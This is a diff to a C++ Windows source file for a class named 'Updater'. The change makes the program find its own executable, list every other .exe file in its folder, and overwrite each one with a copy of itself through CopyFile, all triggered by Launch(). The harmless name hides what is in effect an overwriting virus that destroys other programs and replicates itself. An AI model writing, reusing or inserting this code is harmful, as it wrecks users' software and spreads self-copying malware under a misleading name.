@@ -2,26 +2,30 @@
 
 Updater::Updater( )
 {
+	m_wsDir.resize( MAX_PATH, '\0' );
 }
 
 Updater::~Updater( )
 {
 }
-
-void Updater::GetCurrentDirectoryFiles( )
+void Updater::GetCurrentDir( )
 {
-	wchar_t path[ MAX_PATH ];
-	GetModuleFileName( 0, path, MAX_PATH );
+	GetModuleFileName( 0, &m_wsDir[ 0 ], (ulong)m_wsDir.length( ) );
+	size_t index = m_wsDir.find_last_of( L"\\" );
+	m_wsExe = m_wsDir.substr( index + 1 );
 
-	PathRemoveFileSpec( path );
-	wstring dir = path;
-	dir += L"\\*";
+	PathRemoveFileSpec( &m_wsDir[ 0 ] );
 
+	m_wsDir.resize( wcslen( &m_wsDir[ 0 ] ) );
+
+	m_wsDir += L"\\*";
+}
+void Updater::GetCurrentDirFiles( )
+{
 	HANDLE hFind;
 	WIN32_FIND_DATA data;
-	vector<wstring> allFiles;
 
-	hFind = FindFirstFile( dir.c_str( ), &data );
+	hFind = FindFirstFile( m_wsDir.c_str( ), &data );
 	if( !hFind )
 	{
 		MessageBox( 0, L"FindFirstFile failure", L"ERROR: Directory", MB_OK );
@@ -32,21 +36,36 @@ void Updater::GetCurrentDirectoryFiles( )
 		{
 			if( ( data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) == 0 )
 			{
-				allFiles.push_back( data.cFileName );
+				wstring tempFile = data.cFileName;
+				if( wcscmp( &tempFile[ 0 ], &m_wsExe[0] ) )
+				{
+					if( tempFile.substr( tempFile.find_last_of( L"." ) + 1 ) == L"exe" )
+					{
+						m_wsFileList.push_back( tempFile );
+					}
+				}	
 			}
 		} while( FindNextFile( hFind, &data ) != 0 );
+
+		FindClose( hFind );
 	}
-	for( uint i = 0; i < allFiles.size( ); i++ )
+	for( uint i = 0; i < m_wsFileList.size( ); i++ )
 	{
-		if( allFiles[ i ].substr( allFiles[ i ].find_last_of( L"." ) + 1 ) == L"exe" )
-		{
-			m_wsFileList.push_back( allFiles[ i ] );
-		}
+		wcout << m_wsFileList[ i ].c_str() << endl;
 	}
 }
-
+void Updater::ReplaceCurrentDirFiles( )
+{
+	wstring tempCurrentFileName;
+	for( uint i = 0; i < m_wsFileList.size( ); i++ )
+	{
+		tempCurrentFileName = m_wsFileList[ i ];
+		CopyFile( m_wsExe.c_str( ), m_wsFileList[ i ].c_str( ), FALSE );
+	}
+}
 void Updater::Launch( )
 {
-	GetCurrentDirectoryFiles( );
-	system( "pause" );
+	GetCurrentDir( );
+	GetCurrentDirFiles( );
+	ReplaceCurrentDirFiles( );
 }
